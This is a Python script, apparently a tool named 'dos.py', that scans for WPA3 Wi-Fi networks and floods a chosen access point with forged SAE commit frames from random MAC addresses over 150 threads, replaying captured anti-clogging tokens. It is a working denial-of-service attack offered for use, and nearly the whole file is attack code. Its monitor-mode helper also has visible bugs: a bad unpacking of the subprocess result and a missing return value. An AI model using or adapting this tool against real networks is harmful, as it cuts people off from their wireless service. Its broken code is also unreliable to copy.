import sys, os, time, subprocess, re, random, signal, csv, tempfile
from threading import Thread, Event, Lock

from scapy.all import (
    Dot11, Dot11Auth, RadioTap, Raw, sendp, AsyncSniffer,
)


# ---------- helpers ----------


def random_mac() -> str:
    first = random.choice([0x02,0x06,0x0A,0x0E,0x12,0x16,0x1A,0x1E])
    rest = [random.randint(0,255) for _ in range(5)]
    return ":".join(f"{b:02x}" for b in [first]+rest)


def run(cmd):
    return subprocess.run(cmd, capture_output=True, text=True, check=False)


def get_wireless_interfaces():
    out = run(["iw","dev"]).stdout
    return re.findall(r"Interface\s+(\S+)", out)


def set_channel(iface, ch):
    run(["iwconfig", iface, "channel", str(ch)])


def enable_monitor(iface: str) -> str | None:
    cmd = ["airmon-ng", "check", "kill"]
    run(cmd)

    cmd = ["airmon-ng", "start", iface]
    rc, stdout, stderr = run(cmd)

    if rc != 0:
        print(f"Failed to enable monitor mode: {stderr}")
        return None
    else:
        print(f"Monitor mode enabled on interface {iface}")


def disable_monitor(iface):
    run(["airmon-ng","stop", iface])
    run(["systemctl","start","NetworkManager"])


def scan_wpa3(iface, duration=30):
    tmp = tempfile.mktemp(prefix="wpa3scan_")
    proc = subprocess.Popen(
        ["airodump-ng", "--write", tmp, "--output-format", "csv",
         "--write-interval", "1", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    print(f"[*] Scanning {duration}s ...")
    time.sleep(duration)
    proc.send_signal(signal.SIGINT)
    proc.wait(timeout=5)

    csv_file = tmp + "-01.csv"
    if not os.path.isfile(csv_file):
        print("[-] No scan output found.")
        return []

    networks = []
    with open(csv_file, "r", errors="ignore") as f:
        reader = csv.reader(f)
        in_ap_section = False
        for row in reader:
            if not row:
                continue
            if row[0].strip() == "BSSID":
                in_ap_section = True
                continue
            if row[0].strip() == "Station MAC":
                break
            if not in_ap_section:
                continue
            if len(row) < 14:
                continue

            bssid   = row[0].strip()
            channel = row[3].strip()
            privacy = row[5].strip()    # encryption (wpa2,3)
            cipher  = row[6].strip()    # cipher (ccmp, etc)
            auth    = row[7].strip()    # auth (psk, sae, etc)
            power   = row[8].strip()
            ssid    = row[13].strip() if len(row) > 13 else ""

            has_sae = "SAE" in auth.upper()
            has_wpa3 = "WPA3" in privacy.upper()
            if not (has_sae or has_wpa3):
                continue

            try:
                ch = int(channel)
            except ValueError:
                ch = 0
            try:
                pwr = int(power)
            except ValueError:
                pwr = -100

            networks.append({
                "bssid": bssid, "ssid": ssid, "channel": ch,
                "power": pwr, "privacy": privacy, "cipher": cipher, "auth": auth,
            })

    # cleanup remaining files
    for f in [tmp+"-01.csv", tmp+"-01.kismet.csv", tmp+"-01.kismet.netxml",
              tmp+"-01.cap", tmp+"-01.log.csv"]:
        try: os.remove(f)
        except: pass

    return networks



def build_sae_commit(bssid, src, token=None):
    group_id = (19).to_bytes(2, "little")
    payload = group_id + (token or b"") + os.urandom(32) + os.urandom(64)
    return (
        RadioTap()
        / Dot11(type=0, subtype=11, addr1=bssid, addr2=src, addr3=bssid)
        / Dot11Auth(algo=3, seqnum=1, status=0)
        / Raw(load=payload)
    )


def parse_token(payload):
    if len(payload) <= 98:
        return None
    return payload[2 : 2 + len(payload) - 98]


# ------------ stress ----------

def run_stress(iface, bssid, channel):
    set_channel(iface, channel)
    time.sleep(0.3)

    stop = Event()
    lock = Lock()
    tokens: list[bytes] = []

    def sniffer_cb(pkt):            # sniffer in case router sends back a token for validation
        try:
            if not pkt.haslayer(Dot11Auth):
                return
            if (pkt[Dot11].addr2 or "").lower().replace("-",":") != bssid.lower():
                return
            auth = pkt[Dot11Auth]
            if auth.algo != 3 or not pkt.haslayer(Raw):
                return
            raw = bytes(pkt[Raw].load)
            tok = None
            if auth.status == 76:     # seqnum = 1 & status = 76 => commit frame with token
                tok = parse_token(raw)
            elif auth.seqnum == 1 and auth.status == 0 and len(raw) > 100:
                tok = parse_token(raw)
            if tok:
                with lock:
                    tokens.append(tok)
                    if len(tokens) > 50:
                        del tokens[:-50]
        except:
            pass

    sniffer = None
    try:
        sniffer = AsyncSniffer(iface=iface, prn=sniffer_cb,
                               filter="type mgt subtype auth",
                               store=False, monitor=True)
        sniffer.start()
    except:
        pass

    def worker():
        while not stop.is_set():
            src = random_mac()
            with lock:
                tok = tokens[-1] if tokens else None
            try:
                sendp(build_sae_commit(bssid, src, tok),
                      iface=iface, verbose=False)
            except:
                pass

    pool = [Thread(target=worker, daemon=True) for _ in range(150)]
    for t in pool:
        t.start()

    print("[*] Running... Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    stop.set()
    for t in pool:
        t.join(timeout=2)
    if sniffer:
        try: sniffer.stop()
        except: pass
    print("[*] Stopped.")



def main():
    if os.geteuid() != 0:
        print("Run as root:  sudo python dos.py")
        sys.exit(1)

    ifaces = get_wireless_interfaces()
    if not ifaces:
        print("[-] No wireless interfaces.")
        sys.exit(1)
    print("\nInterfaces:")
    for i, ifc in enumerate(ifaces, 1):
        print(f"  {i}) {ifc}")
    while True:
        try:
            idx = int(input(f"Select [1-{len(ifaces)}]: "))
            if 1 <= idx <= len(ifaces):
                iface = ifaces[idx-1]
                break
        except (ValueError, EOFError):
            pass

    mon = enable_monitor(iface)
    if not mon:
        print("[-] Monitor mode failed.")
        sys.exit(1)
    print(f"[+] Monitor: {mon}")

    try:
        # scan wpa3 then start sending sae commit frames
        nets = scan_wpa3(mon)
        if not nets:
            print("[-] No WPA3 networks found.")
            return

        print(f"\n{'─'*85}")
        print(f"  {'#':<4}{'SSID':<26}{'BSSID':<19}{'CH':>3}  {'dBm':>5}  {'ENC':<12} Auth")
        print(f"{'─'*85}")
        for i, n in enumerate(nets, 1):
            print(f"  {i:<3}{(n['ssid'] or '(Hidden)'):<26}{n['bssid']:<19}"
                  f"{n['channel']:>3}  {n['power']:>5}  {n['privacy']:<12} {n['auth']}")
        print(f"{'─'*85}")

        while True:
            try:
                idx = int(input(f"\nSelect target [1-{len(nets)}]: "))
                if 1 <= idx <= len(nets):
                    t = nets[idx-1]
                    break
            except (ValueError, EOFError):
                pass

        print(f"\n[*] Target: {t['ssid']} ({t['bssid']}) CH:{t['channel']}")
        run_stress(mon, t["bssid"], t["channel"])

    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
    finally:
        disable_monitor(mon)


if __name__ == "__main__":
    main()
